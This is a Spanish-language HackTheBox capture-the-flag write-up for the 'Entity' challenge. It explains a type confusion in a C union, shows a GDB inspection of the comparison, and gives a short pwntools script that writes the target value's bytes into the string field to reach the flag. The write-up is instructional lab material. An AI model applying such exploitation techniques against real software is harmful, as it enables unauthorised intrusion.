---
layout: default
title: Entity
parent: HackTheBox
grand_parent: Writeups
---

# Entity
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---
Tenemos un binario donde explotaremos la vulnerabilidad Type Confusion para utilizar incorrectamente un valor de un tipo como si fuera otro tipo.
{:.lead}

## Analisis

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
### Main

```c
int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    bzero(&DataStore, sizeof(DataStore));
    printf("\nSomething strange is coming out of the TV..\n");
    while (1) {
        menu_t result = menu();
        switch (result.act) {
        case STORE_SET:
            set_field(result.field);
            break;
        case STORE_GET:
            get_field(result.field);
            break;
        case FLAG:
            get_flag();
            break;
        }
    }

}
```
En el main, tenemos un ```switch case``` con 3 opciones, donde dependiendo de lo que este en la funcion ```menu```, es lo que va a hacer

### Menu

```c
menu_t menu() {
    menu_t res = { 0 };
    char buf[32] = { 0 };
    printf("\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    switch (buf[0]) {
    case 'T':
        res.act = STORE_SET;
        break;
    case 'R':
        res.act = STORE_GET;
        break;
    case 'C':
        res.act = FLAG;
        return res;
    default:
        puts("\nWhat's this nonsense?!");
        exit(-1);
    }
```

Nos damos cuenta que en la opcion ```C``` corresponde al ```case FLAG``` de la funcion main:

```c
case FLAG:
    get_flag();
    break;
```
Donde se manda a llamar a la funcion ```get_flag()```:

```c
void get_flag() {
    if (DataStore.integer == 13371337) {
        system("cat flag.txt");
        exit(0);
    } else {
        puts("\nSorry, this will not work!");
    }
}
```
Donde para mostrar la flag, tenemos que hacer que ```DataStore.integer``` sea igual a ```13371337```, sin embargo, hay una funcion que nos lo impide:

```c
void set_field(field_t f) {
    char buf[32] = {0};
    printf("\nMaybe try a ritual?\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    switch (f) {
    case INTEGER:
        sscanf(buf, "%llu", &DataStore.integer);
        if (DataStore.integer == 13371337) {
            puts("\nWhat's this nonsense?!");
            exit(-1);
        }
        break;
    case STRING:
        memcpy(DataStore.string, buf, sizeof(DataStore.string));
        break;
    }

}
```
Donde esta validando si ```DataStore.integer``` es igual a ```13371337``` que imoprima en pantalla el mensaje ```puts("\nWhat's this nonsense?!");``` y sale del programa

### Codigo vulnerable

Cada vez que se esta usando ```DataStore.integer``` se hace referencia a esta estructura:

```c
static union {
    unsigned long long integer;
    char string[8];
} DataStore;
```

En C, la estructura ```union``` puede almacenar varios tipos de datos en la misma direccion de memoria. Por ejemplo, en este caso, ```integer``` es una variable que ocupa 8 bytes en la memoria, la cual almacena un valor entero de 64 bits, y ```string``` es otra variable la cual es una arreglo de caracteres que igual ocupa 8 bytes en la memoria (cada letra es un byte), y nosotros podemos acceder a esas variables a travez de ```DataStorage``` dependiendo de como queremos interpretar los datos dentro de ```union```, y ```union``` se encargara de ponerlas en la misma direccion de memoria, idependientemente del tipo de dato.

Y de toda esta explicacion viene la vulnerabilidad ```Type confusion``` o confusion de tipos, en la cual basicamente es un tipo de vulnerabilidad que ocurre cuando un programa utiliza incorrectamente un valor de un tipo como si fuera otro tipo. Y para este ejercicio podemos utilizar incorrectamente del valor de la variable ```string``` como si fuera el de la variable ```integer```

**Problema**

Al intentar pasarle el numero ```13371337``` como string, indicandole la opcion ```S``` como lo indica el ```case S```:

```c
case 'S':
    res.field = STRING;
    break;
```

El programa no muestra la flag:

![](/assets/img/HTB-entity/tc1.png)

Y es por esta comprobacion:

```c
case STRING:
    memcpy(DataStore.string, buf, sizeof(DataStore.string));
    break;

```
Sin embargo se supone que esta todo "bien", asi que para ver que se esta comparando realmente en ```DataStore.integer == 13371337```

### Analisis con GDB

En un gdb metere un breakpoint en la intruccion donde se realiza la comparacion:

```
0x0000000000001412 <+11>:	cmp    rax,0xcc07c9
```

Primero que nada, lo que esta haciendo ```cmp    rax,0xcc07c9``` es comparar ```DataStorage``` que se guarda en ```rax```, con ```0xcc07c9``` que es el numero ```13371337```. Cuando ejecute el programa yo le indique que se guardara como string.

Al ver el valor de ```rax```:

![](/assets/img/HTB-entity/tc2.png)

Nos podemos dar cuenta que lo que se guarda en ```DataStorage``` es un decimal: ```0x3733333137333331```, entonces para explotar esta confusion de tipos, podemos mandarle el numero 13371337 como string de bytes en little endian, por que ya no se estaria comprobando en la funcion ```set_field```, osea asi:

```
b'\xc9\x07\xcc\x00\x00\x00\x00\x00'
```

## Exploit

Y con todo lo anterior, el exploit queda asi:

```python
from pwn import *

p = process("./entity")

p.sendline("T")
p.sendline("S")
p.sendline(p64(13371337))
p.sendline("C")
p.interactive()
```

Y ya tenemos la flag:

![](/assets/img/HTB-entity/tc3.png)

Eso ha sido todo, gracias por leer ❤
